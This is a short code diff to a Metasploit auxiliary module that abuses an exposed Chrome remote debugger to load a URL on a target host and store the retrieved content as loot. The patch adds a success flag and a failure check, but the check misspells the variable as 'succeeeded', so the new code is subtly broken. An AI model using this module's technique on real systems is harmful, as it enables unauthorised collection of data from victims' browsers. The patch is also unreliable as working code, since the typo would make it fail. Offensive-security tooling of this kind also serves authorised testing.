@@ -74,6 +74,8 @@ class MetasploitModule < Msf::Auxiliary
           print_status('Opened connection')
           id = rand(1024 * 1024 * 1024)
 
+          succeeded = false
+
           EM::Timer.new(1) do
             print_status("Attempting to load url #{fetch_uri}")
             driver.send({
@@ -105,11 +107,13 @@ class MetasploitModule < Msf::Auxiliary
           if data['result']['result']
             print_good('Retrieved resource')
             store_loot('chrome.debugger.resource', 'text/plain', rhost, data['result']['result']['value'], fetch_uri, 'Resource Gathered via Chrome Debugger')
+            succeeded = true
           end
         end
 
         EM::Timer.new(datastore['Timeout']) do
           EventMachine.stop
+          fail_with(Failure::Unknown, 'Unknown failure occurred') if not succeeeded
         end
       }
     end
